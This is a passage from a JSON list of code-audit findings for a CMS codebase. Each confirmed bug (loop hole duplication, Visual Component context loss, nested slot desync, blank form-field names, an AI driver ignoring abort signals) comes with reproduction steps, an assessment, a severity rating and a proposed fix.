page-tree check. Add a guard: when `tableId === 'pages'`, run the incoming `body` cell through `parsePage` + `assertValidNodeTree` and reject with 400 on failure (the import path should skip/quarantine the bad row and bump `rowsSkipped`). This keeps the three system tables coherent regardless of ingress.\n\nDo (1) regardless (defense-in-depth on load); add (2) to stop bad data entering. CWE-754 (improper check for unusual/exceptional condition) / CWE-20 (improper input validation) leading to CWE-400-style availability loss."},{"id":"ISS-021","finder":"bug-publisher","title":"Dynamic node inside a (static) loop body emits one duplicate \u003cinstatic-hole> per iteration, all resolving to the same context-less fragment","category":"bug","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-1007","file":"src/core/publisher/dynamicDetection.ts","lineStart":178,"lineEnd":270,"description":"`walk()` flat-iterates `Object.values(page.nodes)` and adds the id of ANY request-dependent node (Rule 2 binding, Rule 2b inline token, or a dynamic VC ref under Rule 4) to `dynamicPageNodeIds`, with no awareness of whether that node lives inside a `base.loop` template body. A loop whose source is publish-time (static) is NOT itself marked dynamic, so the loop renders inline; but its template-child nodes are still in `page.nodes` and get added to `dynamicNodeIds`. At render time `renderLoop` (src/core/publisher/renderLoop.ts:78-86) round-robins over the loop variants calling `renderNode(variantId, ctx)` once per item, reusing the same `ctx.dynamicNodeIds`. `renderNode` (src/core/publisher/renderNode.ts:253-255) then emits a `\u003cinstatic-hole>` with the SAME node id for every iteration. Result: (a) N DOM elements all carrying the same `id=\"hole-\u003cid>\"` and `data-instatic-hole=\"\u003cid>\"` (invalid duplicate ids); (b) the hole runtime fetches `/_instatic/hole/\u003cid>` N times, each returns the SAME single fragment that `handleHoleRequest` renders with an empty `entryStack` (server/handlers/cms/hole.ts:186), so every loop row shows identical (or empty) content instead of its per-item value.","impact":"A published page with a static-source loop (e.g. a list of posts) whose item template contains a `route.query`-bound prop or `{route.query.x}` token will render every row with the same value and emit duplicate element ids, corrupting the page's per-item content and HTML validity.","reproduction":"1. Register a publish-time loop source (no `requestDependent`). 2. Add a `base.loop` to a page with one child template node that has a `dynamicBindings` entry sourced from `route.query.*` (or a prop containing `{route.query.x}`). 3. Publish. 4. Inspect the artefact: the loop body emits N `\u003cinstatic-hole id=\"hole-\u003cchildId>\">` elements with the same id; on the live page all rows hydrate from the same `/_instatic/hole/\u003cchildId>` fragment.","evidence":"for (const node of Object.values(nodes)) { ... const bindingReason = checkDynamicBindings(node); if (bindingReason) { if (isPageTree) result.dynamicPageNodeIds.add(node.id) ... } ... }  // no loop-body awareness; renderLoop later re-renders the same dynamic id once per item","suggestedFix":"Dynamic detection must treat a `base.loop` body as a request-time boundary handled by the loop itself, not by per-child holes. Either (a) when the walker enters a `base.loop` node, skip adding its descendant template-node ids to `dynamicPageNodeIds` and instead route per-item dynamism through the loop's own render (the loop already runs at request time when its source is request-dependent), or (b) if a loop body genuinely contains request-dependent nodes, mark the LOOP node itself dynamic (single hole) rather than its repeated children. In `renderLoop`, never re-emit a hole for a node id that has already been rendered as a hole in a sibling iteration.","assessment":"The reported bug is real and I reproduced it by running the publisher. dynamicDetection.ts walk() has zero loop-body awareness: it adds the id of any request-dependent node anywhere in the flat page.nodes map to dynamicNodeIds, including nodes that are loop template children. When the loop's own source is publish-time (static), the loop renders inline and round-robins renderNode(variantId, ctx) per item; renderNode then emits an \u003cinstatic-hole> with the same node id every iteration. Result: N DOM elements with duplicate id=\"hole-\u003cchildId>\"/data-instatic-hole (invalid HTML, breaks getElementById and the hole runtime's per-id assumptions), and the per-item entryStack is lost so every row hydrates from the same context-less /_instatic/hole/\u003cchildId> fragment (route.query resolves from the page URL, identical for all rows; empty when no query). This is a publishing correctness/data-integrity bug, not a security vulnerability — it is reachable only via trusted admin authoring (a loop with a static source whose body contains a {route.query.*} token or binding), no privilege boundary is crossed, and there is no XSS/RCE/data-loss. Hence medium, downgraded from the finder's high. The case where the loop source itself is request-dependent is fine (the loop node becomes the single hole and children are never recursed into at publish time); the defect is specific to the static-loop + request-dependent-descendant combination.","replicationSteps":"Confirmed by execution. I wrote a focused test using the publisher test helpers (src/__tests__/publisher/helpers.ts, since removed) that mirrors the report:\n\n- Page: base.body -> base.loop (no sourceId, i.e. checkLoopSource returns null => loop is STATIC) -> child base.text node `card` with dynamicBindings { text: { source: 'route', field: 'query.q' } }.\n- findDynamicNodeIds(page, site, registry) returned exactly [\"card\"] — the loop body child, NOT the loop. So isFullyStaticPage is false; the page bakes as a static shell with Layer C holes.\n- publishPage(...) with loopData of 3 items produced inside the inline-rendered loop wrapper:\n  \u003cinstatic-hole id=\"hole-card\" data-instatic-hole=\"card\" ...>\u003c/instatic-hole> THREE TIMES — three elements with the identical id=\"hole-card\" / data-instatic-hole=\"card\".\n\nMechanism (traced end-to-end):\n1. walk() in src/core/publisher/dynamicDetection.ts:186 flat-iterates Object.values(page.nodes). Loop body children live in the same flat node map (treeSchema.ts: nodes is Record\u003cnodeId, node>, children are id references). checkDynamicBindings (line 201, via isBindingSourceRequestDependent: route + field startsWith 'query.' => true) adds the child id to dynamicPageNodeIds (line 203). There is NO awareness that the child sits inside a base.loop template body.\n2. render.ts:475/488 threads that set into ctx.dynamicNodeIds.\n3. The static loop is NOT in the set, so renderNode dispatches to the base.loop special renderer. renderLoop (renderLoop.ts:78-86) round-robins data.items, calling renderNode(variantId, ctx) once per item, reusing the same ctx.\n4. renderNode (renderNode.ts:253) checks ctx.dynamicNodeIds.has(nodeId) for the SAME variant id each iteration and emits renderHolePlaceholder (line 254) — duplicate id=\"hole-\u003cchildId>\" per row.\n5. At request time the hole runtime fetches /_instatic/hole/\u003cchildId> once per duplicate element; handleHoleRequest -> renderHoleFragment (hole.ts:179-194) renders with entryStack: [] — the per-item loop context is gone. route.query.q resolves to the page URL's ?q= value (or empty), identical for every row.\n\nAuthoring reachability: an admin can put {route.query.q} as a free-text token in any string prop (Rule 2b, checkInlineTokens) inside a loop body — parseTokenString accepts 'route' as a VALID_SOURCE (tokenInterpolation.ts:37-43) and isBindingSourceRequestDependent('route','query.q') is true. Note the structured-binding UI (systemSources.ts ROUTE_SOURCE only offers path/slug, both publish-time), so the inline-token path is the practical authoring route.","falsePositiveReason":"","refinedFix":"Make dynamic detection loop-aware: a base.loop body is a request-time boundary owned by the loop's per-item render, so request-dependent nodes inside a loop body must route their dynamism to the LOOP node (one hole), never to repeated child ids.\n\nConcrete change in src/core/publisher/dynamicDetection.ts walk():\n- Add Rule 3.5: when a node has moduleId === 'base.loop' and its body subtree (its children, transitively, excluding nested loops which own their own boundary) contains any request-dependent node, mark the LOOP node id dynamic and DO NOT descend into the body to add child ids. Implement by probing the loop's descendant subtree with a child WalkResult (like the VC-ref Rule 4 probe at lines 248-267): if subResult has any reason, add the loop's own id to dynamicPageNodeIds and surface inner reasons; either way, skip adding the body children's own ids.\n- This requires walk() to traverse by child references (page tree children are id refs in the flat map) for the loop-body probe, rather than relying on the flat Object.values iteration to visit loop children at page level. The simplest correct shape: keep the flat iteration for top-level/static analysis but, upon encountering a base.loop, (a) compute body dynamism via a scoped subtree walk and (b) record the loop body's descendant ids in a \"suppressed\" set so the outer flat loop does not independently add them to dynamicPageNodeIds.\n\nThen at request time renderHoleFragment already builds loopData for loops inside the requested subtree and renders the full loop with its proper per-item entryStack, so the single loop-level hole hydrates every row correctly.\n\nAdd a regression test in src/__tests__/publisher/loopRender.test.ts (or dynamicDetection.test.ts): a static-source loop with a child bound to route.query.* must yield exactly one hole at the LOOP node id (not N holes at the child id), and isFullyStaticPage must report the loop id, not the child id. Update docs/features/publisher.md \"Auto-detection rules\" to state that a request-dependent node inside a static loop body promotes the whole loop to a Layer C hole."},{"id":"ISS-022","finder":"bug-publisher","title":"base.loop and media assets inside a Visual Component render with no data — renderVisualComponentRef drops loopData/mediaAssets from the synthetic context and loopPrefetch cannot traverse VC trees","category":"bug","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-670","file":"src/core/publisher/renderVisualComponentRef.ts","lineStart":124,"lineEnd":131,"description":"`renderVisualComponentRef` builds `syntheticCtx` carrying only `page, site, registry, breakpointId, templateContext, cssMap`. It omits `loopData`, `mediaAssets`, `infiniteLoopIds`, `publishVersion`, `holeNodeIds`, and `dynamicNodeIds`. Consequently any `base.loop` inside a VC definition body renders the `\u003c!-- instatic: loop ... has no resolved data -->` branch (src/core/publisher/renderLoop.ts:57) because `ctx.loopData` is undefined inside the VC. This is compounded server-side: `collectLoopNodes`/`prefetchLoopData` (server/publish/loopPrefetch.ts:116-126) walk only `page.nodes` via `node.children`; a `base.visual-component-ref`'s page-tree children are just its `base.slot-instance` nodes, so loop nodes living in `vc.tree.nodes` are never collected and never fetched at all. The same omission silently strips responsive media: images inside a VC lose their `_resolvedMediaByKey` (srcset/blurhash/intrinsic dimensions) because `mediaAssets` is dropped. dynamicDetection Rule 4 explicitly recurses into VC trees checking the loop-source rule (src/core/publisher/dynamicDetection.ts:224-268), which shows loops inside VCs are an intended configuration — but they cannot actually produce data.","impact":"Any Visual Component containing a data loop publishes an empty loop (comment marker) instead of the data; any image inside a Visual Component publishes without srcset/sizes/blurhash, degrading the published output. For dynamic VCs rendered through the hole endpoint, `renderHoleFragment` prefetches loops only for the page-tree subtree (rootNodeId = VC ref id), still missing the VC's internal loop nodes.","reproduction":"1. Create a Visual Component whose definition tree contains a `base.loop` (with a registered source) and/or an image module. 2. Drop a `base.visual-component-ref` to it on a page and publish. 3. The loop renders `\u003c!-- instatic: loop \"...\" has no resolved data -->`; the image renders with the raw URL and no srcset/blurhash.","evidence":"const syntheticCtx: RenderContext = { page: syntheticPage, site: ctx.site, registry: ctx.registry, breakpointId: ctx.breakpointId, templateContext: ctx.templateContext, cssMap: ctx.cssMap }  // loopData, mediaAssets, infiniteLoopIds, publishVersion, holeNodeIds, dynamicNodeIds all dropped","suggestedFix":"Thread the data-bearing context fields through the synthetic context: carry `loopData`, `mediaAssets`, `infiniteLoopIds`, `publishVersion`, `holeNodeIds` (and `dynamicNodeIds` if VC-internal holes are ever supported) onto `syntheticCtx`. Correspondingly extend `prefetchLoopData`/`collectLoopNodes` to descend into VC definition trees (resolve `base.visual-component-ref` -> `vc.tree.nodes`) so loop nodes inside VCs are fetched. Since instantiated VC nodes preserve their definition-tree ids, the loopData map keys will match.","assessment":"The report is accurate on every concrete claim and I independently verified each cited line. renderVisualComponentRef.ts:124-131 constructs a fresh syntheticCtx carrying only page/site/registry/breakpointId/templateContext/cssMap and intentionally omits loopData, mediaAssets, infiniteLoopIds, publishVersion, holeNodeIds, dynamicNodeIds. This is a selective omission (templateContext IS threaded, so dynamic bindings work inside VCs, but loops and responsive media do not). The omission is compounded by the server-side prefetch walks (collectLoopNodes, collectMediaPaths) traversing only page.nodes/children, which structurally cannot reach a VC definition body (vc.tree.nodes). dynamicDetection Rule 4 explicitly treats loops inside VCs as a supported configuration, confirming the combination is intended rather than disallowed — yet it produces empty output. No existing test in src/__tests__/publisher/visualComponentRef.test.ts exercises loops or media inside a VC, consistent with an untested real gap. Reachable by unauthenticated public requests (published static pages and the hole endpoint) but the effect is degraded/empty published output, not a security boundary crossing.","replicationSteps":"Traced end-to-end across two independent layers.\n\nLOOP (no-data) path — static publish:\n1. server/publish/publicRenderer.ts:63-65 prefetches loop data: prefetchLoopData(page, site, db, url) with no rootNodeId, so it walks from page.rootNodeId.\n2. prefetchLoopData -> collectLoopNodes (server/publish/loopPrefetch.ts:116-126) walks ONLY page.nodes via node.children. A base.visual-component-ref's page-tree children are exclusively its base.slot-instance nodes (see renderVisualComponentRef.ts:86-95 and slot model). The VC definition body lives in vc.tree.nodes inside the site document, not in page.nodes. So a base.loop inside a VC body is never collected -> never fetched -> absent from loopData map.\n3. Even if it were fetched, renderVisualComponentRef.ts:124-131 builds syntheticCtx WITHOUT loopData (only page/site/registry/breakpointId/templateContext/cssMap). renderNode recurses into the VC body with this stripped ctx.\n4. renderLoop.ts:53,57 reads ctx.loopData?.get(loopId); undefined -> emits `\u003c!-- instatic: loop \"...\" has no resolved data -->`.\n\nMEDIA path:\n1. mediaPrefetch.ts:62-77 collectMediaPaths iterates ONLY page.nodes; image/media props inside vc.tree.nodes are never collected -> not in mediaAssets map.\n2. syntheticCtx also drops mediaAssets. renderNode.ts:153 attachResolvedMediaByKey early-returns when ctx.mediaAssets is undefined (renderNode.ts:79) -> safeProps._resolvedMediaByKey never set -> image renders raw URL, no srcset/sizes/blurhash/intrinsic dims.\n\nHOLE path (dynamic VC ref):\n1. dynamicDetection.ts:224-268 Rule 4 recurses into vc.tree.nodes; a request-dependent loop inside the VC marks the OUTER ref node id dynamic.\n2. renderNode.ts:253-254 emits a hole for the ref; runtime fetches /_instatic/hole/\u003crefId>.\n3. hole.ts:166-194 renderHoleFragment calls prefetchLoopData(page, site, db, url, { rootNodeId: nodeId=refId }). collectLoopNodes(page, refId) walks page.nodes[refId].children = only slot-instances -> VC-body loop never collected. Then renderVisualComponentRef strips loopData again -> no-data comment.\n\nConfirmed instantiateVCAtRef (src/core/visualComponents/instantiate.ts:187,216) preserves the original vc.tree.nodes ids in the synthetic page, so the finder's proposed fix (prefetch keyed by VC-body node ids) would produce matching map keys.\n\ninfiniteLoopIds: also dropped; renderLoop.ts:99 lazily creates a new Set on the discarded syntheticCtx, so an infinite loop inside a VC would never register the loop-runtime script even if it had data (moot since it renders empty).","falsePositiveReason":"","refinedFix":"Two coordinated changes are required; threading the context alone is insufficient because the prefetch never collects VC-body nodes.\n\n1) Thread data-bearing fields onto syntheticCtx in renderVisualComponentRef.ts:124-131:\n   loopData: ctx.loopData, mediaAssets: ctx.mediaAssets, infiniteLoopIds: ctx.infiniteLoopIds, publishVersion: ctx.publishVersion, holeNodeIds: ctx.holeNodeIds. Leave dynamicNodeIds OUT for now (VC-internal holes are not supported; the OUTER ref is what gets holed), and document that. Because instantiateVCAtRef preserves vc.tree.nodes ids, loopData/holeNodeIds keys will match the synthetic page node ids.\n\n2) Make the prefetch walks descend into VC definition trees so VC-body loop and media nodes are actually fetched:\n   - collectLoopNodes (server/publish/loopPrefetch.ts:116-126): when a node is base.visual-component-ref, resolve its VC via selectVisualComponentById(site, componentId) and recurse into vc.tree.nodes from vc.tree.rootNodeId (guarding against VC ref cycles, mirroring dynamicDetection's activeVcStack). This requires passing `site` into collectLoopNodes/prefetchLoopData (prefetchLoopData already has `site`).\n   - collectMediaPaths (server/publish/mediaPrefetch.ts:62-77): likewise resolve base.visual-component-ref nodes and also scan vc.tree.nodes for image/media props (and slot defaultValue VCNode trees), with the same cycle guard.\n\nPrefer factoring the cycle-safe \"walk page + descend into VC trees\" traversal into one shared helper in @core/visualComponents (or reuse the dynamicDetection walker structure) so loop-prefetch, media-prefetch, and dynamic-detection cannot drift apart — matches the repo's single-walker philosophy.\n\n3) Add publisher tests: (a) a VC whose body contains a base.loop with a registered publish-time source renders the resolved items (not the no-data comment); (b) an image inside a VC body emits srcset/blurhash; (c) the hole endpoint for a dynamic VC ref containing a request-dependent loop returns populated rows.\n\nUpdate docs/features/publisher.md to state that loop and media prefetch descend into VC definition trees."},{"id":"ISS-026","finder":"bug-vcomponents","title":"syncAllVCRefSlotInstances ignores VC refs nested inside other Visual Components, leaving stale/missing slot-instances","category":"data-integrity","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-665: Improper Initialization (incomplete state reconciliation leading to data-integrity inconsistency)","file":"src/admin/pages/site/store/slices/visualComponentsSlice.ts","lineStart":258,"lineEnd":275,"description":"`syncAllVCRefSlotInstances` only iterates `site.pages` and re-syncs the `base.slot-instance` children of `base.visual-component-ref` nodes found in page trees. It never iterates `site.visualComponents[*].tree.nodes`. But a VC ref can legally live inside ANOTHER VC's tree (the recursion guard `wouldCreateCycle` exists precisely to support nested VC refs, and `insertComponentRef` in nodeActions.ts materializes slot-instances for refs inserted in VC mode at lines 226-241). All three slot-shape mutation entry points pass only `site.pages`: addParam (line 534), removeParamWithCleanup (line 586), and renameParam (line 747). Consequently, when an author adds, removes, or renames a slot param on VC-B while VC-B is referenced from inside VC-A's tree, the nested ref's slot-instance children are never reconciled: a newly added slot gets no `base.slot-instance` child under the nested ref, and a removed slot leaves an orphaned slot-instance.","impact":"Nested Visual Component instances silently lose or drop slot content in published output. When a new slot is added to a child VC, every nested ref of that VC inside other VCs has no slot-instance, so at publish time `renderVisualComponentRef` builds an empty `slotInstancesByName` for that slot and the slot-outlet falls back to default/placeholder content — the author's intended fill location is unreachable for nested usages, and any content the author later tries to place there has no materialized, locked slot-instance to host it. The page tree's invariant ('exactly one locked base.slot-instance per declared slot, in order') is violated for the entire nested-VC subgraph, producing incorrect rendered pages.","reproduction":"1. Create VC-A and VC-B. 2. In VC-A's canvas, drop a `base.visual-component-ref` to VC-B (allowed; cycle guard passes). insertComponentRef materializes slot-instances for VC-B's current slots inside VC-A's tree. 3. In VC-B, add a new `base.slot-outlet`/slot param. addParam calls syncAllVCRefSlotInstances(site.pages, ...) which scans only pages — VC-A's nested ref is never touched. 4. The nested ref in VC-A now declares a slot with no matching base.slot-instance child. 5. Use VC-A on a page and publish: the new slot renders empty/default instead of being a fillable slot for the nested usage.","evidence":"function syncAllVCRefSlotInstances(\n  pages: Array\u003c{ nodes: Record\u003cstring, PageNode> }>,\n  vcId: string,\n  vc: VisualComponent,\n): void {\n  for (const page of pages) {\n    for (const node of Object.values(page.nodes)) {\n      if (\n        node.moduleId === 'base.visual-component-ref' &&\n        node.props.componentId === vcId\n      ) {\n        const treeNodes = page.nodes as Record\u003cstring, BaseNode>\n        const syncResult = syncSlotInstances(node as BaseNode, vc, treeNodes)\n        applySlotSyncResult(treeNodes, syncResult, node.id)\n      }\n    }\n  }\n}","suggestedFix":"Make slot-shape reconciliation traverse every tree that can host a VC ref, not just pages. Add the other VCs' trees to the sweep, e.g. change `syncAllVCRefSlotInstances` to accept both `site.pages` and `site.visualComponents` (each contributing its `tree.nodes`/`page.nodes` map) and run `syncSlotInstances`/`applySlotSyncResult` over refs found in all of them — skipping the VC being edited only where self-reference is impossible. Apply the same expanded scope to the propOverrides cleanup loop in removeParamWithCleanup (lines 569-581).","assessment":"The report is accurate. I independently confirmed: (a) nested VC refs are a supported scenario gated only by the cycle guard, which permits non-cyclic nesting; (b) insertComponentRef in VC mode does materialize slot-instances inside the host VC's tree, so those children exist and must be kept in sync; (c) all three slot-shape mutation entry points pass only site.pages to syncAllVCRefSlotInstances, which never visits VC trees; (d) crucially, there is NO compensating heal path — the persistence-layer reconciler syncVCSlotInstancesInPages is also pages-only and validateVisualComponents doesn't call it, and assertValidNodeTree doesn't enforce the slot-instance invariant; (e) the publisher genuinely depends on these slot-instances being present (renderVisualComponentRef.ts:86-95 reads slot-instance children; missing ones fall back to default/placeholder). This is a genuine data-integrity defect that produces incorrect published output for nested VC usage. I am downgrading severity from the reported 'high' to 'medium': the only trigger is a trusted admin editing a VC's param surface through normal admin UI; no privilege boundary is crossed, it is not reachable by unauthenticated/public requests, untrusted plugins, or untrusted imported content, and it does not cause RCE/sandbox escape. It is silent content corruption confined to nested-VC subgraphs, recoverable by re-authoring, and not a security vulnerability.","replicationSteps":"Traced end-to-end:\n1. Nested VC refs are a real, supported scenario. `insertComponentRef` (src/admin/pages/site/store/slices/site/nodeActions.ts:191-247) in VC mode resolves the active VC's tree (lines 226-228) and inserts a `base.visual-component-ref` node into VC-A's `tree.nodes`, then materializes slot-instances there via syncSlotInstances/applySlotSyncResult (lines 240-241). The cycle guard `wouldCreateCycle` (src/core/visualComponents/recursionGuard.ts:100-157) permits embedding a distinct VC-B inside VC-A as long as no cycle/diamond exists, so this is legal.\n2. Editing VC-B's slot shape calls one of three slice actions, all passing ONLY `site.pages`: addParam (visualComponentsSlice.ts:534), removeParamWithCleanup (line 586), renameParam (line 747). `syncAllVCRefSlotInstances` (lines 258-275) iterates only `pages`, never `site.visualComponents[*].tree.nodes`.\n3. Therefore VC-A's nested ref to VC-B is never reconciled: a newly added slot has no `base.slot-instance` child under the nested ref; a removed slot leaves an orphaned slot-instance; a renamed slot leaves a stale slotName.\n4. No healing path exists either. The persistence-layer reconciler `syncVCSlotInstancesInPages` (src/core/persistence/validate.ts:521-537) is only invoked from validatePages (line 138) and also iterates only `pages`; `validateVisualComponents` (lines 158-177) does NOT run slot reconciliation. The store helper `reconcileVCRefsForVc` (helpers.ts:51-76) is likewise pages-only. `assertValidNodeTree` (operationSchema.ts:80-116) validates structure only (root/children/cycles) and does not enforce the one-slot-instance-per-slot invariant, so the stale tree is neither rejected nor repaired.\n5. At publish, the nested ref renders through renderVisualComponentRef twice: when VC-A is instantiated by instantiateVCAtRef (instantiate.ts:120-196 passes a nested ref through as a normal node carrying its children), then the nested ref is re-rendered and builds slotInstancesByName from its `base.slot-instance` children in the synthetic page (renderVisualComponentRef.ts:86-95). With no matching slot-instance, instantiateVCAtRef falls back to the slot param defaultValue or keeps the outlet as a placeholder (instantiate.ts:141-164) — the author's intended fill location is unreachable for nested usages.","falsePositiveReason":"","refinedFix":"Reconcile slot-instances across EVERY tree that can host a VC ref, not just pages, at every layer that currently only sweeps pages.\n\n1. Generalize the mutation-time sweep. Change `syncAllVCRefSlotInstances` to accept a list of node maps (each page's `nodes` plus each VC's `tree.nodes`) and run syncSlotInstances/applySlotSyncResult over refs found in all of them. At the three call sites (addParam:534, removeParamWithCleanup:586, renameParam:747) pass both `site.pages` (as `{nodes}`) and `site.visualComponents` (as `{nodes: vc.tree.nodes}`). The VC being edited can itself contain a ref to a *different* VC, so do not skip any VC tree; only self-reference is impossible and is already prevented by the cycle guard.\n\n2. Extend the propOverrides cleanup loop in removeParamWithCleanup (lines 569-581) to also iterate every VC tree's nodes, deleting `propOverrides[paramId]` from nested refs, so the same scope mismatch is fixed for prop params too.\n\n3. Heal stored drift at load. In src/core/persistence/validate.ts, generalize `syncVCSlotInstancesInPages` to a tree-agnostic `syncVCSlotInstances(nodeMaps, visualComponents)` and call it for BOTH `pages` and `visualComponents[*].tree.nodes`. Wire it into validateVisualComponents (currently lines 158-177 run no slot reconciliation) so existing corrupted documents self-heal on next load.\n\n4. Generalize the store helper `reconcileVCRefsForVc` (helpers.ts:51-76) the same way so any other reconcile path covers VC trees.\n\n5. Add regression coverage: extend the slot-edit propagation integration tests (e.g. slotEditPropagation.test.ts) with a case where VC-B is nested inside VC-A, then add/remove/rename a slot on VC-B and assert VC-A's nested ref has exactly one in-order base.slot-instance per slot.\n\nBecause the project is pre-release with no backward-compat obligations, prefer the single tree-agnostic reconciler over duplicating page/VC logic."},{"id":"ISS-027","finder":"bug-forms","title":"Form controls with a blank name silently drop their submitted value (field-mapping mismatch between rendered HTML and snapshot binding)","category":"bug","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-20: Improper Input Handling (field-mapping/data-binding mismatch causing dropped input and spurious validation rejection)","file":"src/core/forms/snapshot.ts","lineStart":106,"lineEnd":122,"description":"The control snapshot derives its submission key as `name = stringProp(node, 'name', fieldId) || fieldId`, i.e. it falls back to the field id when the author leaves the `name` prop blank. The `name` prop default is an empty string (`InputPropsSchema`/`TextareaPropsSchema`/etc. all declare `name: Type.String({ default: '' })`). But the published HTML renderer emits `['name', props.name]` through `attrs()`, which filters out empty strings (`value !== ''`), so a control with a blank `name` is rendered WITHOUT a `name` attribute. The browser's `FormData` (and therefore `collectValues` in formRuntime.ts) only includes named controls, so that field's value is never sent. On the server, `validateFormSubmission` keys `controlByName` by `control.name ?? control.fieldId` (= fieldId) and then runs the required-enforcement loop: the fieldId key is absent from `input.values`, so a required field produces a spurious `required` error and a non-required field is silently stored as null. The rendered input and the snapshot binding disagree on the submission key.","impact":"Any form control where the author bound a data field (set fieldId) but left the Name prop at its empty default — the normal/expected authoring path — never submits its value. Required fields reject every legitimate submission with 'This field is required'; optional fields silently store null, losing the visitor's data. This breaks the core form feature for the default configuration.","reproduction":"Drop a base.form (mode=cms) with a base.input, bind it to a data field (set fieldId), leave the Name prop blank, mark it required, publish. Load the page, fill the field, submit. Server returns 400 'Invalid form values' with a `required` error for that field even though it was filled, because the rendered \u003cinput> had no name attribute and FormData omitted it.","evidence":"snapshot.ts: `const name = stringProp(node, 'name', fieldId) || fieldId`  /  modules render: `['name', props.name]` then `attrs()` does `.filter(([, value]) => value !== undefined && value !== null && value !== '')`","suggestedFix":"Make the rendered name attribute and the snapshot key agree. Either render `name` with a fieldId fallback (`['name', props.name || props.fieldId]`) in every form-control module, or stop falling back to fieldId in `controlBindingFromNode` and instead derive the snapshot key from exactly what the renderer emits. The cleanest fix is to make `name` default to the bound fieldId at render time and key the validator off that same value.","assessment":"Real correctness bug, fully traced. The rendered HTML name attribute and the server-side submission key (fieldId fallback) genuinely disagree whenever an author binds a control via fieldId but leaves the Name prop blank. Because the published renderer's attrs() drops empty-string attributes, the control has no name in the DOM, FormData omits it, and the server either rejects a filled required field or silently stores null for an optional one. I confirmed every link: the render functions, attrs() filtering, the client collectValues using FormData, the snapshot key derivation, and the validateFormSubmission keying + required loop. The finder's logic is accurate. I downgraded severity from the finder's 'high': this is not reachable by an unauthenticated/public attacker to escalate privilege or corrupt arbitrary data — it requires a trusted admin to author a form in a specific (non-preset) way, and the most common guided path (presets) sets name and works. The impact (broken/silently-lossy form for one authoring configuration on a single-tenant CMS) is a real functional bug worth fixing but is operator-triggered, not an external attack surface, so medium is the honest rating. The 'name' prop being a separate authorable field that diverges from fieldId is the underlying design smell.","replicationSteps":"End-to-end trace confirmed against the actual code:\n\n1. RENDER: A `base.input` (or textarea/select/checkbox/radio) with `fieldId` set and `name` left at its `Type.String({ default: '' })` default. The render fn (src/modules/base/forms/index.ts:254-268) emits `['name', props.name]` through `attrs()`. `attrs()` (lines 521-526) filters `value !== ''`, so a blank `name` produces NO `name` attribute on the rendered `\u003cinput>`. fieldId is emitted only as `data-instatic-field-id`, not as `name`.\n\n2. CLIENT COLLECT: On submit, `collectValues(form)` (server/forms/formRuntime.ts:142-156) builds `new FormData(form)`, which keys entries strictly by the DOM `name` attribute. A control with no `name` attribute is excluded entirely, so the field never appears in the POSTed `values` object sent to /_instatic/form/submit.\n\n3. SERVER SNAPSHOT KEY: `controlBindingFromNode` (src/core/forms/snapshot.ts:106-122) sets `name = stringProp(node, 'name', fieldId) || fieldId`, i.e. the snapshot control's `name` becomes the fieldId when the prop is blank.\n\n4. SERVER VALIDATE: handler.ts:95 calls `validateFormSubmission({ table, controls: snapshot.controls, values })`. In validation.ts, `controlByName` is keyed by `control.name ?? control.fieldId` (= fieldId, line 33). The required-enforcement loop (lines 81-97) checks `Object.hasOwn(input.values, name)` with `name = control.name ?? control.fieldId` (= fieldId, line 84). Because step 2 omitted the field, this is false: a required field pushes a spurious `{code:'required'}` error (400 'Invalid form values'); an optional non-boolean field is silently skipped and stored as null (data loss).\n\nThe validation tests (src/__tests__/forms/formValidation.test.ts:31-54) confirm the validator is internally consistent keyed by fieldId — values there are keyed by fieldId. The defect is solely that the rendered HTML omits the `name` attribute, so the browser-built FormData can never key by fieldId.\n\nScope note: the guided authoring path is unaffected. The insertion presets (src/admin/pages/site/module-picker/insertionPresets.ts:56-128 — Contact form, Newsletter signup) explicitly set `name` equal to `fieldId` on every control, so they render a `name` attribute and submit correctly. The bug requires a manually-dropped standalone control with fieldId set and name left blank. There is no admin-side warning for this (formSettingsAnalysis.ts:358 silently treats name as fieldId).","falsePositiveReason":"","refinedFix":"Make the rendered `name` attribute agree with the snapshot/validation key, which already falls back to fieldId. In src/modules/base/forms/index.ts, change every form-control render to emit `props.name || props.fieldId` for the name attribute:\n\n- InputModule.render (line 258): `['name', props.name || props.fieldId]`\n- TextareaModule.render (line 300): `['name', props.name || props.fieldId]`\n- SelectModule.render (line 334): `['name', props.name || props.fieldId]`\n- choiceModule render (checkbox/radio, line 514): `['name', props.name || props.fieldId]`\n\nAnd mirror the same fallback in the editor preview components (src/modules/base/forms/FormControls.tsx) so the canvas preview matches: `name={props.name || (props.fieldId as string)}` on InputEditor/TextareaEditor/SelectEditor/CheckboxEditor/RadioEditor. (The editor `*Props` types currently omit `fieldId`; add `fieldId: string` to InputProps/TextareaProps/SelectProps/ChoiceProps.)\n\nThis is the minimal change that restores agreement: snapshot.ts already keys by `name || fieldId`, validation.ts already keys by `control.name ?? control.fieldId`, and the presets already set name=fieldId, so making render do the same fallback unifies all four sites. Add a regression test that derives a snapshot for a control with fieldId set and name blank, renders it, asserts the HTML contains `name=\"\u003cfieldId>\"`, and that validateFormSubmission with values keyed by fieldId succeeds. (A cleaner long-term option is to drop the separate authorable `name` prop entirely and always derive the submission name from fieldId, eliminating the divergence at the source — consistent with the repo's no-band-aid stance — but the fallback fix above is sufficient and low-risk.)"},{"id":"ISS-029","finder":"bug-ai","title":"Anthropic driver ignores the request abort signal — closed/aborted chats keep generating billed tokens and leak the stream","category":"performance","provisionalSeverity":"high","severity":"medium","status":"confirmed","confidence":"high","replicated":true,"cwe":"CWE-404: Improper Resource Shutdown or Release","file":"server/ai/drivers/anthropic.ts","lineStart":205,"lineEnd":231,"description":"`buildQueryOptions` constructs the Claude Agent SDK `Options` without ever wiring `req.signal` into the SDK. The SDK exposes `Options.abortController` (sdk.d.ts:1143 — \"When aborted, the query will stop and clean up resources\") and `query().interrupt()`, but neither is used. `req.signal` is only forwarded into the per-tool `ToolContext.signal` (lines 134/263/294), never into the agent loop itself. The OpenAI driver, by contrast, passes `signal: req.signal` to `runner.run(...)` (server/ai/drivers/openai.ts:161), so this is Anthropic-specific — and Anthropic is the default/primary provider.","impact":"When the admin clicks the abort button or closes the browser tab, the HTTP request aborts but the Anthropic agent loop keeps running to completion server-side: it continues calling the model, consuming and billing tokens with no way to stop. With `maxTurns` also 